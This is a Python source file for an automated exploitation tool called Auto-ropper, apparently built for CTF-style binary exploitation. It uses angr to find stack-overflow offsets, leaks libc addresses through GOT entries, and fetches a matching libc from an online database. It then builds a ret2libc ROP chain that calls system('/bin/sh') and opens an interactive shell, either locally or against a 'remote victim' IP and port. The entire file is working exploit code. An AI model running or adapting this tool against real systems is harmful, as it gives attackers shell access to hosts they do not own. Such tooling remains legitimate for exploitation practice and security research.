import angr
from angr import sim_options as so
import claripy
import time
import timeout_decorator
import IPython
import logging
from pwn import *
import requests
from bs4 import BeautifulSoup
import os
import shutil
import argparse
import hashlib
import sqlite3

logging.basicConfig()
logging.root.setLevel(logging.INFO)

loud_loggers = ["angr.engines", "angr.sim_manager", "angr.simos", "angr.project", "angr.procedures", "cle", "angr.storage"]
for loud_logger in loud_loggers:
	logging.getLogger(loud_logger).setLevel(logging.ERROR)

logging.getLogger("angr.project").disabled=True

log = logging.getLogger(__name__)

is_printable = False

#context.log_level = 'debug'

class Database():
	def __init__(self, binary, aslr):
		self.md5sum = pwnlib.util.hashes.md5filehex(binary)
		self.aslr = aslr
		self.db = sqlite3.connect('./database/database')
		self.cursor = self.db.cursor()
		self.create_database()
		self.cursor.execute("SELECT md5sum FROM binaryInfo")
		data = self.cursor.fetchall()
		self.pwn_state = any(self.md5sum in data for data in data)

	def create_database(self):
		self.cursor.execute("DROP TABLE IF EXISTS binaryInfo")
		self.cursor.execute("DROP TABLE IF EXISTS payload")
		self.cursor.execute('CREATE TABLE IF NOT EXISTS binaryInfo (md5sum varchar(50) PRIMARY KEY, offset int, libc varchar(100), aslr int)')
		self.cursor.execute('CREATE TABLE IF NOT EXISTS payload (md5sum varchar(50), payload1 varchar(1000), payload2 varchar(1000), FOREIGN KEY (md5sum) REFERENCES binaryInfo(md5sum) ON DELETE SET null)')
	
	def add_basics(self):
		request = "INSERT INTO binaryInfo (md5sum, aslr) VALUES (?,?)"
		self.cursor.execute(request, (self.md5sum, self.aslr))
		self.db.commit()

	def add_offset(self, offset):
		self.cursor.execute('UPDATE binaryInfo SET offset = ? WHERE md5sum = ?',(offset, self.md5sum))
		self.db.commit()

	def add_libc(self, libc):
		self.cursor.execute('UPDATE binaryInfo SET libc = ? WHERE md5sum = ?',(libc, self.md5sum))
		self.db.commit()

	def prep_md5sum(self):
		request = "INSERT INTO payload (md5sum) VALUES (?)"
		self.cursor.execute(request, (self.md5sum,))
		self.db.commit()

	def add_p1(self, p1):
		self.cursor.execute("UPDATE payload SET payload1 = ? WHERE md5sum = ?", (p1, self.md5sum))
		self.db.commit()

	def add_p2(self, p2):
		self.cursor.execute("UPDATE payload SET payload2 = ? WHERE md5sum = ?", (p2, self.md5sum))
		self.db.commit()

class Exploit(Database):
	def __init__(self, binary, arch="amd64", ip=None, port=None):
		self.ip = ip 
		self.port = port
		self.binary_name = binary
		self.elf = ELF(binary)
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_find_libc = "https://libc.blukat.me/?q="
		self.url_download_libc = "https://libc.blukat.me/d/"
		Database.__init__(self, binary, self.elf.aslr)
		if not self.pwn_state:
			self.add_basics()
			self.prep_md5sum()
		os.path.join(os.getcwd(), "libc")
		if self.ip is not None and self.port is not None:
			try:
				self.p = remote(self.ip,self.port)
			except:
				log.warning("Couldn't connect... Aborting.")
				exit(-1)
		else:
			self.p = self.elf.process()
		context.arch = arch

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def overflow_detect_filter(self, simgr):

		for state in simgr.unconstrained:
			bits = state.arch.bits
			num_count = bits / 8
			pc_value = b"C" * int(num_count)

			# Check satisfiability
			if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

				state.add_constraints(state.regs.pc == pc_value)
				user_input = state.globals["user_input"]

				log.info("Found vulnerable state.")

				if is_printable:
					log.info("Constraining input to be printable")
					for c in user_input.chop(8):
						constraint = claripy.And(c > 0x2F, c < 0x7F)
						if state.solver.satisfiable([constraint]):
							state.add_constraints(constraint)

				# Get input values
				input_bytes = state.solver.eval(user_input, cast_to=bytes)
				log.info("[+] Vulnerable path found {}".format(input_bytes))
				if b"CCCC" in input_bytes:
					log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
				state.globals["offset"] = input_bytes.index(b"CCCC")
				state.globals["input"] = input_bytes
				simgr.stashes["found"].append(state)
				simgr.stashes["unconstrained"].remove(state)
				break

		return simgr

	def checkOverflow(self, binary_name, inputType="STDIN"):
		binary_name = binary_name
		extras = {
			so.REVERSE_MEMORY_NAME_MAP,
			so.TRACK_ACTION_HISTORY,
			so.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
			so.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
		}

		class hookFour(angr.SimProcedure):
			IS_FUNCTION = True

			def run(self):
				return 4  # Fair dice roll

		p = angr.Project(binary_name, load_options={"auto_load_libs": False})
		# Hook rands
		p.hook_symbol("rand", hookFour)
		p.hook_symbol("srand", hookFour)
		# p.hook_symbol('fgets',angr.SIM_PROCEDURES['libc']['gets']())

		# Setup state based on input type
		argv = [binary_name]
		input_arg = claripy.BVS("input", 300 * 8)
		if inputType == "STDIN":
			state = p.factory.full_init_state(args=argv, stdin=input_arg)
			state.globals["user_input"] = input_arg
		elif inputType == "LIBPWNABLE":
			handle_connection = p.loader.main_object.get_symbol("handle_connection")
			state = p.factory.entry_state(
				addr=handle_connection.rebased_addr, stdin=input_arg, add_options=extras
			)
			state.globals["user_input"] = input_arg
		else:
			argv.append(input_arg)
			state = p.factory.full_init_state(args=argv)
			state.globals["user_input"] = input_arg

		state.libc.buf_symbolic_bytes = 0x100
		state.globals["inputType"] = inputType
		simgr = p.factory.simgr(state, save_unconstrained=True)

		run_environ = {}
		run_environ["offset"] = None
		end_state = None
		# Lame way to do a timeout
		try:

			@timeout_decorator.timeout(120)
			def exploreBinary(simgr):
				simgr.explore(
					find=lambda s: "offset" in s.globals, step_func=self.overflow_detect_filter
				)

			exploreBinary(simgr)
			if "found" in simgr.stashes and len(simgr.found):
				end_state = simgr.found[0]
				run_environ["offset"] = end_state.globals["offset"]

		except (KeyboardInterrupt, timeout_decorator.TimeoutError) as e:
			log.info("[~] Keyboard Interrupt")

		if "input" in run_environ.keys():
			run_environ["input"] = end_state.globals["input"]
			log.info("[+] Triggerable with input : {}".format(end_state.globals["input"]))

		return run_environ

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		if instance == self.rop:
			if len(payload) % 16 != 0:
				log.info("Payload not aligned... Aligning it.")
				rop2 = ROP(self.elf)
				available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
				for func in available_funcs:
					self.recovery(rop2,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
				self.recovery(rop2, "Couldn't find ret", rop2.find_gadget(["ret"])[0])
				self.recovery(rop2,f"No main found...", self.elf.symbols["main"])
				payload2 = [
					b"A"*offset,
					rop2.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload
		else:
			if len(payload) % 16 != 0:
				self.recovery(self.roplibc, "Couldn't find ret", self.roplibc.find_gadget(["ret"]))
				self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
				self.recovery(self.roplibc,"Didn't found exit...","exit")
				payload2 = [
					b"A"*offset,
					self.roplibc.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload

	def join_cwd(self, path):
		return os.path.join(os.getcwd(), path)

	def main(self):
		if self.pwn_state and self.elf.aslr != True:
			self.cursor.execute("SELECT payload1, payload2 FROM payload WHERE md5sum = ?",(self.md5sum,))
			data = self.cursor.fetchall()
			print(data)
			print(self.p.recvline())
			print(self.p.recvline())
			self.p.sendline(data[0][0])
			print(self.p.recvline())
			print(self.p.recvline())
			print(self.p.recvline())
			print(self.p.recvline())
			print(self.p.recvline())
			self.p.sendline(data[0][1])
			self.p.interactive()
			exit(0)

		overflow_result = self.checkOverflow(self.binary_name)
		offset = overflow_result.get("offset")
		self.add_offset(offset)
		self.p.recvline()
		log.info("Leaking available address...")

		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop,offset)
		self.add_p1(payload1)
		self.p.sendline(payload1)
		leaked_addr_list = []
		#self.p.interactive()
		self.p.recv()

		for name in available_funcs: 
			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
			name_leaked = name+":"+hex(leaked)
			leaked_addr_list.append(name_leaked)
		
		log.info("Looking for a libc...")
		leaked_addr = ",".join(leaked_addr_list)
		page = requests.get(self.url_find_libc+leaked_addr)
		soup = BeautifulSoup(page.content,"html.parser")
		scrap = soup.find(class_="lib-item")
		if scrap == None:
			log.warning("Libc not found... Aborting")
			exit(-1)
		libc_found = "".join(scrap.text.split()) + ".so"
		log.info("Found a LIBC that could work (found it on https://libc.blukat.me/).")
		log.info("Testing with following LIBC: " + libc_found)
		
		if libc_found != "":
			if (libc_found) not in os.listdir('./libc/'):
				log.info("Downloading libc... Could take some time depending of your internet")
				req = requests.get(self.url_download_libc+libc_found, allow_redirects=True)
				open(libc_found,'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found)
				self.add_libc(LIBC)
				src = self.join_cwd(libc_found)
				to = self.join_cwd(os.path.join("libc", libc_found))
				shutil.move(src, to)
			else:
				log.info('LIBC already downloaded previously')
				LIBC = "./libc/" + str(libc_found)
				self.add_libc(LIBC)
			if LIBC:
				self.libc = ELF(LIBC) 
				self.libc.address = leaked - self.libc.symbols[available_funcs[-1]]
				log.info(f"base libc @ {hex(self.libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		self.roplibc = ROP(self.libc)
		self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
		self.recovery(self.roplibc,"Didn't found exit...","exit")

		payload2 = self.payload_generator(self.roplibc, offset)

		self.add_p2(payload2)
		self.p.sendline(payload2)
		self.p.interactive()

class Gui(): 
	def __init__(self):
		pass

	def gui():
		pass

if __name__ == "__main__":
	parser = argparse.ArgumentParser(
		description='Auto-ropper is a tool that aims to automate the exploitation of ROPchain.'
		)

	mode = parser.add_subparsers(title="mode")

	local_attack = mode.add_parser("local", parents=[parser], add_help=False, description="For local pwning")
	local_attack.add_argument("-b","--binary",help="Path to binary")
	local_attack.add_argument("-a","--arch",help="Arch on which the binary is. Default is amd64.\n 'aarch64': {'bits': 64, 'endian': 'little'}\n 'alpha': {'bits': 64, 'endian': 'little'}\n 'amd64': {'bits': 64, 'endian': 'little'}\n 'arm': {'bits': 32, 'endian': 'little'}\n 'avr': {'bits': 8, 'endian': 'little'}\n 'cris': {'bits': 32, 'endian': 'little'}\n 'i386': {'bits': 32, 'endian': 'little'}\n 'ia64': {'bits': 64, 'endian': 'big'}\n 'm68k': {'bits': 32, 'endian': 'big'}\n 'mips': {'bits': 32, 'endian': 'little'}\n 'mips64': {'bits': 64, 'endian': 'little'}\n 'msp430': {'bits': 16, 'endian': 'little'}\n 'none': {}, 'powerpc': {'bits': 32, 'endian': 'big'}\n 'powerpc64': {'bits': 64, 'endian': 'big'}\n 'riscv': {'bits': 32, 'endian': 'little'}\n 's390': {'bits': 32, 'endian': 'big'}\n 'sparc': {'bits': 32, 'endian': 'big'}\n 'sparc64': {'bits': 64, 'endian': 'big'}\n 'thumb': {'bits': 32, 'endian': 'little'}\n 'vax': {'bits': 32, 'endian': 'little'}")
	local_attack.set_defaults(which="local")
	
	remote_attack = mode.add_parser("remote", parents=[parser], add_help=False, description="For remote pwning")
	remote_attack.add_argument("-b","--binary",help="Path to binary")
	remote_attack.add_argument("-a","--arch",help="Arch on which the binary is")
	remote_attack.add_argument("-i","--ip",help="IP of remote victim")
	remote_attack.add_argument("-p","--port",help="Port of remote victim")
	remote_attack.set_defaults(which="remote")

	gui = mode.add_parser("gui", parents=[parser], add_help=False, description="Launch GUI")
	gui.set_defaults(which="gui")

	args = parser.parse_args()

	if args.which == "local":
		if not args.binary:
			log.warning("No binary given... Please provide one.")
		else:
			if args.arch:
				local_exploit = Exploit(args.binary, args.arch)
				local_exploit.main()
			else:
				local_exploit = Exploit(args.binary)
				local_exploit.main()

	if args.which == "remote":
		if not args.binary and not args.ip and not args.port:
			log.warning("Please verify that you gave the binary path, the ip and port for a remote attack.")
		else:
			remote_exploit = Exploit(args.binary, args.ip, int(args.port))
			remote_exploit.main()

	if args.which == "gui":
		print("gui")
